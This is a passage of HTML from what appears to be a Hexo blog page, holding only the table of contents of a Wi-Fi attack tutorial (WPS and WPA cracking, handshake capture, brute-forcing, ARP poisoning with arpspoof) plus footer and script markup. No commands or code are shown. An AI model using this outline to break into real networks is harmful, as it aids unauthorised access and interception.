href="#WPA%E7%A0%B4%E8%A7%A3-%E5%95%9F%E7%94%A8WPS%E4%B8%94PBC%E6%B2%92%E5%95%9F%E7%94%A8"><span class="toc-article-text">WPA破解(啟用WPS且PBC沒啟用)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E5%95%9F%E7%94%A8WPS"><span class="toc-article-text">查看是否啟用WPS</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A0%B4%E8%A7%A3WPS"><span class="toc-article-text">破解WPS</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#WPA%E7%A0%B4%E8%A7%A3-%E7%A6%81%E7%94%A8WPS%E6%88%96PBC%E5%95%9F%E7%94%A8"><span class="toc-article-text">WPA破解(禁用WPS或PBC啟用)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%96%E5%BE%97%E6%8F%A1%E6%89%8B%E5%8C%85"><span class="toc-article-text">取得握手包</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%89%B5%E5%BB%BA%E5%AD%97%E5%85%B8"><span class="toc-article-text">創建字典</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%86%E7%A2%BC%E7%88%86%E7%A0%B4"><span class="toc-article-text">密碼爆破</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8A%A0%E9%80%9FWPA%E7%A0%B4%E8%A7%A3"><span class="toc-article-text">加速WPA破解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Cracking-the-Key-Quicker-using-a-Rainbow-Table-%E4%BB%A5%E7%A9%BA%E9%96%93%E6%8F%9B%E6%99%82%E9%96%93"><span class="toc-article-text">Cracking the Key Quicker using a Rainbow Table(以空間換時間)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Cracking-WPA-WPA2-Much-Faster-Using-GPU-%E4%BD%BF%E7%94%A8GUI%E7%A0%B4%E8%A7%A3"><span class="toc-article-text">Cracking WPA&#x2F;WPA2 Much Faster Using GPU(使用GUI破解)</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%80%A3%E6%8E%A5%E5%BE%8C%E6%94%BB%E6%93%8A"><span class="toc-article-text">連接後攻擊</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Post-Connection-Attacks"><span class="toc-article-text">Post Connection Attacks</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Installing-Windows-As-a-Virtual-machine"><span class="toc-article-text">Installing Windows As a Virtual machine</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Post-Connection-Attacks-%E8%B3%87%E6%96%99%E8%92%90%E9%9B%86"><span class="toc-article-text">Post Connection Attacks-資料蒐集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#netdiscover"><span class="toc-article-text">netdiscover</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#GUI-Nmap"><span class="toc-article-text">GUI Nmap</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MITM"><span class="toc-article-text">MITM</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ARP-Poisoning-Using-arpspoof"><span class="toc-article-text">ARP Poisoning Using arpspoof</span></a></li></ol></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <!--
+<p>
+  
+  &copy; 2024 Zhi's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+//於底下添加沒用的版本訊息
+--->
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
